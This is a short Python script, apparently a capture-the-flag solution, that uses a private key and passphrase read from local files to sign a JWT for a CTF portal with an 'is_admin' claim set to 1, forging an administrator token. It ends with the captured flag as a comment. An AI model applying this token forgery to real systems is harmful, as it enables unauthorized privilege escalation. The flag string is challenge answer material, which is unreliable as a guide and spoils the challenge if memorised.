import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

private_key_path = './private.pem'
passphrase_path = './passphrase'

payload = {
  "iss": "http://ctf.protergo.party:10004/api/portal_login",
  "iat": 1707453011,
  "exp": 1707456611,
  "nbf": 1707453011,
  "jti": "dpZLq91B0S3QODmw",
  "sub": "13",
  "prv": "3da04507aadf132cee732fdee4ef6aa390dec579",
  "is_admin": 1
}

with open(private_key_path, 'rb') as key_file:
    with open(passphrase_path, 'rb') as passphrase_file:
        private_key = serialization.load_pem_private_key(
            data=key_file.read(),
            password=passphrase_file.read().strip(),
            backend=default_backend()
        )

token = jwt.encode(payload, private_key, algorithm='RS256', headers={"typ": "JWT"})
print(token)

# PROTERGO{673311e2d939238eaa08e461b0f4be5928293e26ac16ada1b5dbfed335c544b7}